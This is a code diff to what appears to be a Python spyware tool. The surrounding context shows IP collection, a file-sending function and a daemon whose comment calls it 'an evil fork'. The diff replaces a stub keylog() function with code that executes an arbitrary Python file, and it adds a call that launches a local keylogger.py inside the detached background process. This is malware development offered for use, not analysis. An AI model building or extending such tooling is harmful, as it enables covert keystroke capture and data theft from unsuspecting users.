@@ -110,11 +110,15 @@ def getIPaddr():
 
     return host, ip, external_ip    
 
-def keylog():
-    #while True:
-        
-    #your code here
-    
+def keylog(filepath, globals=None, locals=None):
+    if globals is None:
+        globals = {}
+    globals.update({
+        "__file__": filepath,
+        "__name__": "__main__",
+    })
+    with open(filepath, 'rb') as file:
+        exec(compile(file.read(), filepath, 'exec'), globals, locals)
     return 0
     
 def sendFile(dataFile,  keyLoc, filename):
@@ -209,6 +213,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
         
     #I am the child connection, I am an evil fork and shouldn't HUP
    # Flush I/O  buffers  and lockdown stderr/out/in
+    keylog("/home/michael/sandbox/project/mine/keylogger.py")
     sys.stdout.flush() 
     sys.stderr.flush()
     
